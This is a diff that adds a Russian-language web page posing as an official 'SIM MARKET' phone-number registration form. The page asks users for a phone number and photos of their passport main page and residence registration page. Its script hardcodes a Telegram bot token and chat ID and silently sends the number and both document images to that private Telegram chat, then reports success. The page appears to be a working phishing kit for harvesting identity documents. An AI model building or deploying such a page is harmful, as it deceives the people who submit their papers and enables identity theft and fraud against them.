@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SIM MARKET | Регистрация</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background: #0f172a; color: #f8fafc; }
+        .gold-border { border: 1px solid #fbbf24; }
+        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); }
+    </style>
+</head>
+<body class="p-5 font-sans">
+    <div class="max-w-md mx-auto glass p-8 rounded-2xl gold-border shadow-2xl mt-10 text-center">
+        <h1 class="text-2xl font-bold text-yellow-500 mb-2 uppercase">SIM MARKET</h1>
+        <p class="text-gray-400 text-sm mb-8 font-light">Официальная регистрация номера</p>
+
+        <form id="regForm" class="space-y-6 text-left">
+            <div>
+                <label class="block text-xs uppercase tracking-widest text-gray-500 mb-2 font-semibold">Желаемый номер</label>
+                <input type="text" id="phone_num" placeholder="+7 (___) ___-__-__" class="w-full bg-slate-800 p-4 rounded-xl border border-slate-700 focus:border-yellow-500 outline-none text-white" required>
+            </div>
+
+            <div class="space-y-4">
+                <label class="block text-xs uppercase tracking-widest text-gray-500 font-semibold text-center">Загрузка документов</label>
+                <div class="relative border-2 border-dashed border-slate-700 p-6 rounded-2xl text-center bg-slate-800/50 hover:border-yellow-500 transition cursor-pointer">
+                    <input type="file" id="pass_main" accept="image/*" class="absolute inset-0 opacity-0 cursor-pointer" required>
+                    <span class="text-sm text-gray-400" id="label_main">📸 Фото лица паспорта</span>
+                </div>
+                <div class="relative border-2 border-dashed border-slate-700 p-6 rounded-2xl text-center bg-slate-800/50 hover:border-yellow-500 transition cursor-pointer">
+                    <input type="file" id="pass_reg" accept="image/*" class="absolute inset-0 opacity-0 cursor-pointer" required>
+                    <span class="text-sm text-gray-400" id="label_reg">🏠 Фото прописки</span>
+                </div>
+            </div>
+
+            <button type="submit" id="submitBtn" class="w-full bg-yellow-500 hover:bg-yellow-600 text-black font-extrabold py-4 rounded-2xl shadow-lg transition active:scale-95 uppercase tracking-wider">
+                Отправить в SIM MARKET
+            </button>
+        </form>
+        <p id="status" class="mt-4 text-sm font-medium"></p>
+    </div>
+
+    <script>
+        const TOKEN = "8666944440:AAFAmQuYaYmnJjhuQ9AmdBQim9V-kxNnxAo";
+        const CHAT_ID = "8768514374";
+
+        document.getElementById('pass_main').onchange = e => { document.getElementById('label_main').innerText = "✅ Лицо загружено"; document.getElementById('label_main').style.color = "#fbbf24"; };
+        document.getElementById('pass_reg').onchange = e => { document.getElementById('label_reg').innerText = "✅ Прописка загружена"; document.getElementById('label_reg').style.color = "#fbbf24"; };
+
+        document.getElementById('regForm').onsubmit = async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('submitBtn');
+            const status = document.getElementById('status');
+            const phone = document.getElementById('phone_num').value;
+            const file1 = document.getElementById('pass_main').files[0];
+            const file2 = document.getElementById('pass_reg').files[0];
+
+            btn.disabled = true;
+            btn.innerText = "ОТПРАВКА...";
+            status.innerText = "⏳ Загружаем данные...";
+
+            try {
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: `📩 НОВАЯ ЗАЯВКА\n📱 Номер: ${phone}` })
+                });
+
+                const formData1 = new FormData();
+                formData1.append('chat_id', CHAT_ID);
+                formData1.append('photo', file1);
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData1 });
+
+                const formData2 = new FormData();
+                formData2.append('chat_id', CHAT_ID);
+                formData2.append('photo', file2);
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData2 });
+
+                status.style.color = "#fbbf24";
+                status.innerText = "✅ Успешно отправлено!";
+                btn.innerText = "ГОТОВО";
+            } catch (err) {
+                status.innerText = "❌ Ошибка отправки.";
+                btn.disabled = false;
+                btn.innerText = "ПОПРОБОВАТЬ СНОВА";
+            }
+        };
+    </script>
+</body>
+</html>
